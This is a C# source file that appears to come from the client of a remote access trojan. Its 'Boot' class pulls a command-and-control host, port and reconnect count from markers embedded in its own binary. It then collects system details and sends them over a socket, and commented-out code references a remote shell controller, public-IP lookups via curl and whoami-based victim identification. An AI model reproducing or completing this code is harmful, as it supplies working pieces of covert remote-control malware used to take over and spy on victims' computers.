using Microsoft.Win32;
using System;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Client.Controllers.Tools
{
    //BootController
    public class Boot
    {
        //Thread Deco
        public Socket socket;
        public IPEndPoint iep;
        public TextWriter tw;
        public TcpClient clientReconnectTries;
        public bool clientLog;
        public bool stopReconnectTries;
        private string[] readerFactory = { "host", "port", "recoTries" };

        public string host { get; set; }
        public ushort port { get; set; }
        public int numReconnectTries { get; set; }

        public Boot()
        {
            foreach (string index in readerFactory)
            {
                doSomethingWithReader(index);
            }
        }

        public static string getMutexKey(StreamReader readerMutex)
        {
            string mutex = readerMutex.ReadToEnd();
            mutex = mutex.Substring(mutex.IndexOf("-STARTmutex-"), mutex.IndexOf("-ENDmutex-") - mutex.IndexOf("-STARTmutex-"));
            string mutexKey = mutex.Replace("-STARTmutex-", "");
            return mutexKey;
        }

        public void doSomethingWithReader(string readerFactoIndex)
        {
            StreamReader reader = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
            string readerString = reader.ReadToEnd();
            readerString = readerString.Substring(readerString.IndexOf("-START" + readerFactoIndex + "-"), readerString.IndexOf("-END" + readerFactoIndex + "-") - readerString.IndexOf("-START" + readerFactoIndex + "-"));
            if (readerFactoIndex == "host")
            {
                host = readerString.Replace("-START" + readerFactoIndex + "-", "");
            }
            else if (readerFactoIndex == "port")
            {
                port = ushort.Parse(readerString.Replace("-START" + readerFactoIndex + "-", ""));
            }
            else if (readerFactoIndex == "recoTries")
            {
                numReconnectTries = int.Parse(readerString.Replace("-START" + readerFactoIndex + "-", ""));
            }
            else
            {
                return;
            }
        }

        public void getSysInfo()
        {
            string internetCountryCode = null;
            string internetIpPublic = null;
            try
            {
                //internetCountryCode = RemoteShellController.callCmd("curl", "ipinfo.io/country");
                //internetIpPublic = RemoteShellController.callCmd("curl", "ipinfo.io/ip");
            }
            catch { }
            string localCountryCode = CultureInfo.CurrentCulture.TwoLetterISOLanguageName;
            if (localCountryCode == null || localCountryCode.Length != 2)
            {
                localCountryCode = "?";
            }
            if (internetCountryCode == null || internetCountryCode.Trim().Length != 2)
            {
                internetCountryCode = "?";
            }
            string architecture = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + ' ';
            try
            {
                if (IntPtr.Size == 8)
                {
                    architecture += "64 Bit";
                }
                else
                {
                    architecture += "32 Bit";
                }

            }
            catch { }
            architecture += ' ' + localCountryCode.ToUpper();
            //string envoi = RemoteShellController.callCmd("whoami", "");
            //string[] splitedSysinfo = envoi.Split('\\');
            //string clientInfo = splitedSysinfo[1].Trim() + '@' + splitedSysinfo[0].ToUpper() + '§' + architecture + '§' + internetCountryCode.ToUpper();
            NetworkStream nw = new NetworkStream(socket);
            TextWriter tw1 = new StreamWriter(nw);
            //tw1.WriteLine(clientInfo);
            tw1.Flush();
        }
    }
}
